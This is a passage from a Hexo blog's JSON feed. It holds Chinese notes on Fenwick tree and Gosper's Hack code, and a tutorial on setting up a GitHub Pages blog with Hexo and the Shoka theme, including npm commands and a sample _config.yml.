function\">lowbit</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">lowbit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//x 的二进制中，最低位的 1 以及后面所有 0 组成的数。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// lowbit(0b01011000) == 0b00001000</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">//          ~~~~^~~~</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">// lowbit(0b01110010) == 0b00000010</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">//          ~~~~~~^~</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">return</span> x <span class=\"token operator\">&amp;</span> <span class=\"token operator\">-</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 区间查询</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>查询 a<span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>r<span class=\"token punctuation\">]</span> 的和 <span class=\"token operator\">=</span> a<span class=\"token punctuation\">[</span><span class=\"token number\">1.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>r<span class=\"token punctuation\">]</span> 的和减去 a<span class=\"token punctuation\">[</span><span class=\"token number\">1.</span><span class=\"token punctuation\">.</span><span class=\"token number\">.1</span><span class=\"token punctuation\">]</span> 的和</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//a [1]..a [x] 的和</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">;</span> i <span class=\"token operator\">-=</span> <span class=\"token function\">lowbit</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        res <span class=\"token operator\">+=</span> tr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        while (x > 0) &#123;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            res += c[x];</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            x -= lowbit(x);</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 单点修改</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> v<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> M<span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token function\">lowbit</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        tr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> v<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"小众算法\"><a class=\"anchor\" href=\"#小众算法\">#</a> 小众算法</h1>\n<h2 id=\"gospers-hack\"><a class=\"anchor\" href=\"#gospers-hack\">#</a> Gosper's Hack</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjA1MTIyOTY=\">https://zhuanlan.zhihu.com/p/360512296</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phc29uY2hlbl9nYmQvYXJ0aWNsZS9kZXRhaWxzLzQ0OTQ4NTIz\">https://blog.csdn.net/jasonchen_gbd/article/details/44948523</span></p>\n<p>利用位运算，生成 n 元集合所有 k 元子集（求组合 C 值）</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">GospersHack</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> cur <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> k<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> limit <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>cur <span class=\"token operator\">&lt;</span> limit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// do something</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">int</span> lb <span class=\"token operator\">=</span> cur <span class=\"token operator\">&amp;</span> <span class=\"token operator\">-</span>cur<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> r <span class=\"token operator\">=</span> cur <span class=\"token operator\">+</span> lb<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        cur <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>r <span class=\"token operator\">^</span> cur<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token function\">__builtin_ctz</span><span class=\"token punctuation\">(</span>lb<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> r<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 或：cur = (((r ^ cur) >> 2) /lb) | r;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>__builtin_ctz(x)</strong>：x 末尾 0 的个数。x=0 时结果未定义。</p>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9ibG9nL2NvbnRlbnQvMjc3Lw==\">https://www.acwing.com/blog/content/277/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9zb2x1dGlvbi9jb250ZW50LzEzODMxNi8=\">https://www.acwing.com/solution/content/138316/</span></li>\n</ol>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/As%20Developers/Hexo+Shoka%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/",
            "url": "http://yoursite.com/As%20Developers/Hexo+Shoka%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/",
            "title": "Github Pages+Hexo搭建个人Blog",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"github\"><a class=\"anchor\" href=\"#github\">#</a> Github</h1>\n<ol>\n<li>Github 账号</li>\n<li>创建 Github 仓\n<ul>\n<li>仓库名 <code>[username].github.io</code></li>\n<li>仓库描述 Description</li>\n<li>...</li>\n<li>其余保持原设置</li>\n</ul>\n</li>\n<li>本地安装 NodeJS，npm 命令</li>\n<li>本地安装 Git</li>\n</ol>\n<h1 id=\"hexo\"><a class=\"anchor\" href=\"#hexo\">#</a> Hexo</h1>\n<p><code>npm install -g hexo-cli</code></p>\n<p><code>hexo -v</code></p>\n<p><code>hexo init xh1xxhg</code></p>\n<p><code>cd xh1xxhg</code></p>\n<p><code>npm install</code></p>\n<p><strong>启动（本地测试）</strong></p>\n<p><code>hexo clean</code>  该命令可以解决一些报错，比如说代码块显示不完整</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnR3aW5rbGluZy50b3AvMjAyMy8xMS8xNi9ub3RlL3Nob2thJTIwJUU0JUI4JUJCJUU5JUEyJTk4JUU2JTkwJUFEJUU1JUJCJUJBJUU4JUJGJTg3JUU3JUE4JThCLw==\">shoka 主题搭建过程</span></p>\n<p><code>hexo g</code></p>\n<p><code>hexo server</code></p>\n<h1 id=\"shoka主题\"><a class=\"anchor\" href=\"#shoka主题\">#</a> Shoka 主题</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==\">https://github.com/amehime/hexo-theme-shoka</span></p>\n<p>配置教学博客</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaG9rYS5sb3N0eXUubWUvY2F0ZWdvcmllcy9jb21wdXRlci1zY2llbmNlL25vdGUvdGhlbWUtc2hva2EtZG9jLw==\">https://shoka.lostyu.me/categories/computer-science/note/theme-shoka-doc/</span></p>\n<p><code>git clone https://github.com/amehime/hexo-theme-shoka.git ./themes/shoka</code></p>\n<h1 id=\"plugins\"><a class=\"anchor\" href=\"#plugins\">#</a> Plugins</h1>\n<p><strong>修改站点配置文件</strong></p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> landscape</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>=<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> shoka</pre></td></tr></table></figure><p><strong>hexo-renderer-multi-markdown-it</strong></p>\n<p>删除原 markdown 渲染器 <code>npm un hexo-renderer-marked --save</code></p>\n<pre><code>npm i hexo-renderer-multi-markdown-it --save\n</code></pre>\n<p><strong>autoprofixer</strong></p>\n<pre><code>npm install hexo-autoprefixer --save\n</code></pre>\n<p><strong>hexo-algoliasearch</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTczNDA0L2FydGljbGUvZGV0YWlscy8xMjI4NjEzMjE=\">Hexo 集成 Algolia 实现搜索功能</span></p>\n<pre><code>npm install hexo-algoliasearch --save\n</code></pre>\n<p><strong>hexo-symbols-count-time</strong></p>\n<pre><code>npm install hexo-symbols-count-time\n</code></pre>\n<p><strong>hexo-feed</strong></p>\n<pre><code>npm install hexo-feed --save-dev\n</code></pre>\n<h1 id=\"根目录配置文件\"><a class=\"anchor\" href=\"#根目录配置文件\">#</a> 根目录配置文件</h1>\n<p>在尝试中搞懂配置规则，可以将 <code>Project/themes/shoka/example</code>  目录下的文件 copy 到 Hexo 博客项目的根目录实现一键配置，加速对该主题建站模式的理解</p>\n<h2 id=\"_configyml\"><a class=\"anchor\" href=\"#_configyml\">#</a> _config.yml</h2>\n<p>站点配置文件</p>\n<p>其中对 <code>category_map</code>  的类别设置其实无关紧要，博客中的类别需要在书写 markdown 时对其进行设置</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Hexo Configuration</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">## Docs: http://hexo.io/docs/configuration.html</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">## Source: https://github.com/hexojs/hexo/</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># Site</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token key atrule\">title</span><span class=\"token punctuation\">:</span> Hexo</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token key atrule\">subtitle</span><span class=\"token punctuation\">:</span> subtitle</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token key atrule\">description</span><span class=\"token punctuation\">:</span> 描述123</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token key atrule\">keywords</span><span class=\"token punctuation\">:</span> 关键词1<span class=\"token punctuation\">,</span>关键词2 <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token key atrule\">author</span><span class=\"token punctuation\">:</span> John Doe</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token key atrule\">language</span><span class=\"token punctuation\">:</span> zh<span class=\"token punctuation\">-</span>CN <span class=\"token comment\"># 这里只可以选 zh-CN、zh-HK、zh-TW、ja、en 这几个格式</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token key atrule\">timezone</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Asia/Shanghai'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># URL</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> http<span class=\"token punctuation\">:</span>//yoursite.com</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token key atrule\">root</span><span class=\"token punctuation\">:</span> /</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token key atrule\">permalink</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>title/ <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token key atrule\">permalink_defaults</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># Directory</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token key atrule\">source_dir</span><span class=\"token punctuation\">:</span> source</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token key atrule\">public_dir</span><span class=\"token punctuation\">:</span> public</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token key atrule\">tag_dir</span><span class=\"token punctuation\">:</span> tags</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token key atrule\">archive_dir</span><span class=\"token punctuation\">:</span> archives</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token key atrule\">category_dir</span><span class=\"token punctuation\">:</span> categories</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token key atrule\">code_dir</span><span class=\"token punctuation\">:</span> downloads/code</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token key atrule\">i18n_dir</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>lang</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token key atrule\">skip_render</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># Writing</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token key atrule\">new_post_name</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">:</span>title.md <span class=\"token comment\"># File name of new posts</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token key atrule\">default_layout</span><span class=\"token punctuation\">:</span> post</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token key atrule\">titlecase</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># Transform title into titlecase</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token key atrule\">external_link</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># Open external links in new tab</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token key atrule\">field</span><span class=\"token punctuation\">:</span> site <span class=\"token comment\"># Apply to the whole site</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token key atrule\">filename_case</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token key atrule\">render_drafts</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token key atrule\">post_asset_folder</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token key atrule\">relative_link</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token key atrule\">future</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token key atrule\">highlight</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token key atrule\">line_number</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token key atrule\">auto_detect</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  <span class=\"token key atrule\">tab_replace</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token key atrule\">prismjs</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># Category &amp; Tag</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token key atrule\">default_category</span><span class=\"token punctuation\">:</span> uncategorized</pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token key atrule\">category_map</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  <span class=\"token key atrule\">计算机科学</span><span class=\"token punctuation\">:</span> computer<span class=\"token punctuation\">-</span>science</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  <span class=\"token key atrule\">Java</span><span class=\"token punctuation\">:</span> java</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token key atrule\">二进制杂谈</span><span class=\"token punctuation\">:</span> note</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  <span class=\"token key atrule\">零基础学Java语言-浙江大学-翁恺</span><span class=\"token punctuation\">:</span> course<span class=\"token punctuation\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token key atrule\">Theme Shoka Documentation</span><span class=\"token punctuation\">:</span> theme<span class=\"token punctuation\">-</span>shoka<span class=\"token punctuation\">-</span>doc</pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token key atrule\">tag_map</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># Date / Time format</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">## Hexo uses Moment.js to parse and display date</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">## You can customize the date format as defined in</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">## http://momentjs.com/docs/#/displaying/format/</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token key atrule\">date_format</span><span class=\"token punctuation\">:</span> YYYY<span class=\"token punctuation\">-</span>MM<span class=\"token punctuation\">-</span>DD</pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token key atrule\">time_format</span><span class=\"token punctuation\">:</span> HH<span class=\"token punctuation\">:</span>mm<span class=\"token punctuation\">:</span>ss</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># Pagination</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">## Set per_page to 0 to disable pagination</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token key atrule\">per_page</span><span class=\"token punctuation\">:</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token key atrule\">pagination_dir</span><span class=\"token punctuation\">:</span> page</pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\"># Extensions</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">## Plugins: http://hexo.io/plugins/</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">## Themes: http://hexo.io/themes/</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> shoka <span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\"># edit for Theme.shoka</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token key atrule\">autoprefixer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>  <span class=\"token key atrule\">exclude</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token string\">'*.min.css'</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token key atrule\">markdown</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>  <span class=\"token key atrule\">render</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 渲染器设置</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token key atrule\">html</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">false</span> <span class=\"token comment\"># 过滤 HTML 标签</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token key atrule\">xhtmlOut</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 使用 '/' 来闭合单标签 （比如 &lt;br />）。</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token key atrule\">breaks</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 转换段落里的 '\\n' 到 &lt;br>。</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token key atrule\">linkify</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span> <span class=\"token comment\"># 将类似 URL 的文本自动转换为链接。</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token key atrule\">typographer</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token key atrule\">quotes</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'“”‘’'</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>  <span class=\"token key atrule\">plugins</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># markdown-it 插件设置</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>toc<span class=\"token punctuation\">-</span>and<span class=\"token punctuation\">-</span>anchor</pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 文章目录以及锚点应用的 class 名称，shoka 主题必须设置成这样</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>          <span class=\"token key atrule\">tocClassName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'toc'</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>          <span class=\"token key atrule\">anchorClassName</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'anchor'</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token key atrule\">name</span><span class=\"token punctuation\">:</span> markdown<span class=\"token punctuation\">-</span>it<span class=\"token punctuation\">-</span>multimd<span class=\"token punctuation\">-</span>table</pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token key atrule\">enable</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token key atrule\">options</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>          <span class=\"token key atrule\">multiline</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>          <span class=\"token key atrule\">rowspan</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>          <span class=\"token key atrule\">headerless</span><span class=\"token punctuation\">:</span> <span class=\"token boolean important\">true</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    <span class=\"token punctuation\">-</span> <span class=\"token key atrule\">plugin</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td 